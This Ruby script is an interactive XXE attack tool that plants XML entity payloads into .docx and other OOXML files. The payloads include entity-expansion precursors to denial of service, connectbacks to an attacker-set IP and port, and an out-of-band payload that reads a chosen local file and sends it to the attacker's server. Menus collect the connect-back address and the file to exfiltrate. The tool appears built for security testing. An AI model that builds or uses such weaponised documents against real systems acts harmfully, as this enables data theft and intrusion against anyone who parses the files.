# encoding: ASCII-8BIT

require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'
require './helper'


# Global variables, these can be hardcoded to save time
@input_file = ""
@ip = ""
@payload_file = ""
@port = ""
@in = "\t"

# Keep the payloads organized
def read_payloads()	
	pl = {}
	pl["vanilla_entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>', "A simple XML entity."]
	pl["vanilla_recursive"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML entity, precursor to billion laughs attack."]	
	pl["vanilla_parameter"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>>', "A simple parameter entity. This is useful to test if parameter entities are filtered."]
	pl["vanilla_parameter_recursive"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>>', "Recursive parameter entity, precusor to parameter entity billion laughs"]
	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>', "Parameter Entity Connectback, the simplest connect back test."]
	pl["dbl_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>',"This implements an effective OOB technique. It needs to be paired with a vaid DTD on the server."]
	pl["rc_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>',"The same OOB technique but retrieves a file. Again needs to be paired with a valid DTD on the server."]
	pl["parameter_connectback_ftp"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP:PORT/b.dtd">%a;]>>',"FTP connectback test."]
	pl["xinclude_root"] = ['<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP:PORT/clown.html" parse="text"/></root>', "XInclude test"]

	return pl
end

# This method retrieves the payloads and allows the user to assign a payload
#	that will be used in the document. 
def select_payload
	ploads = read_payloads()
	payload = ""
	choose do |menu|
		menu.prompt = "Choose XXE payload:"	
		ploads.each do |pload|
			menu.choice pload[0] do payload = pload[1][0] end
		end
		menu.choice "Print XXE Payload Values" do 
			i = 0
			ploads.each do |pload|
				i = i +1
				puts "#{i}. #{pload[1][1]} \n\t #{pload[1][0]}"				
			end			
			main
			exit
		end
		
	end
	if payload =~ /IP/ and @ip.size == 0
		@ip = ask("Payload Requires a connect back IP:")
		payload = payload.gsub("IP",@ip)	
	end
	if payload =~ /FILE/ and @payload_file.size == 0
		@file_payload = ask("Payload Requires a file to check for:")	
		payload = payload.gsub("FILE",@file_payload)	
	end
	if payload =~ /PORT/ and @port.size == 0
		@port = ask("Payload allows for connect back port to be specified:")	
		payload = payload.gsub("PORT",@port)	
	end
	
	return payload
end

# this does a simple substitution of the [X]XE into the document DOCTYPE.
#	It also resets the xml from standalone "yes" to "no"
def payload(document,payload)
	# insert the payload, TODO this should be refactored
	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")	
	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")
	return document
end

# Insert the payload into every XML document in the document
def add_payload_all(fz,payload)
	fz.each do |name|
		add_payload(name, payload)
	end		 
end

# The menu for selecting the payload and the XML file to insert into
def choose_file(docx)
	fz = list_files(docx)
	payload = select_payload
	puts "|+| #{payload} selected"
	choose do |menu|
		menu.prompt = "Choose File to insert XXE into:"
		menu.choice "Insert Into All Files Creating Multiple OOXML Files (Recommended)" do add_payload_all(fz, payload) end
		menu.choice "Insert Into All Files In Same OOXML File" do add_payload_all(fz, payload) end
		fz.each do |name|
			menu.choice name do add_payload(name, payload) end
		end		 
	end
end


# Allow the user to specify their input file
def list_files_menu
	if(@input_file.size > 0)
		# TODO check if this exists
		puts "|+| Using #{@input_file}"
		choose_file(@input_file)
	else
		docx = ask("Please Enter Input File (Defaults to samples/sample.docx):")
		if docx.downcase == "Q"
			return
		else
			docx = @input_file.size == 0 ? docx : @input_file
			docx = docx.size == 0 ? "./samples/sample.docx" : docx
			@input_file = docx
			
			# check if file exists
			if File.file?(docx)		
				puts "|+| #{docx} Loaded\n"
				choose_file(docx)
			else
				puts "|!| #{docx} cannot be found."
			end
		end
	end
end

# have the user set global variables
def set_globals
	choose do |menu|
		menu.prompt = "Set Global Variables (q to return):"
		menu.choice "Set Connect Back IP" do
			@ip = ask("IP:")
		end
		menu.choice "OXML File To Inject Into" do
			@input_file = ask("Input File:")
		end
		menu.choice "Payload File to Exfiltrate" do
			@payload_file = ask("Payload File:")
		end
		menu.choice "Connect Back Port" do
			@port = ask("Port:")
		end
		menu.choice "Print Globals" do
			puts "\t|+| IP: #{@ip}"
			puts "\t|+| PORT: #{@port}"
			puts "\t|+| INPUT FILE: #{@input_file}"
			puts "\t|+| PAYLOAD FILE: #{@payload_file}"
		end
		menu.hidden "q" do
			return
		end
	end
end

# The main menu
def main
	while(true)
		puts "\n"
		choose do |menu|
			menu.prompt = "Select Options"
			menu.choice "Build XE Document" do list_files_menu end
			menu.choice "Build XE Document and Replace Strings" do find_string end
			menu.choice "Set Global Variables" do set_globals end
			menu.choice "Quit" do exit end
		end
	end
end

main
